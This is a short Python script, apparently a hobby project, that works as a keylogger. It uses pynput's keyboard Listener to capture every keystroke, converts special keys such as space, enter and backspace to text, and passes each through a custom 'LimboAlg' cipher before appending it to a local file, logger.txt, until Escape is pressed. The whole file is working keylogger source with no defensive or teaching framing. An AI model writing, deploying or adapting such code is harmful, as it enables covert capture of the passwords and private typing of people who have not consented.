from pynput.keyboard import Key, Controller, Listener
import os
import LimboAlg
Keyboard = Controller()
def main():
    def on_press(key):
        keydata = key
        keycode_to_replace = {
            'Key.space': ' ',
            'Key.enter': '\n',
            'Key.backspace': '<--',
            "'": '',
            'Key.shift': ''
        }    
        if keydata != Key.esc:
            keydata = str(keydata)
            for key,value in keycode_to_replace.items():
                keydata = keydata.replace(key,value)
            with open('logger.txt', 'a') as logs:
                new_keydata = LimboAlg.cipher(keydata)
                logs.write(new_keydata)
        else:
            listener.stop()
            # os.remove('logger.txt')
            with open('logger.txt', 'r') as l:
                l.close()
    with Listener( 
        on_press=on_press) as listener:
        listener.join()
if __name__ == "__main__":
    main()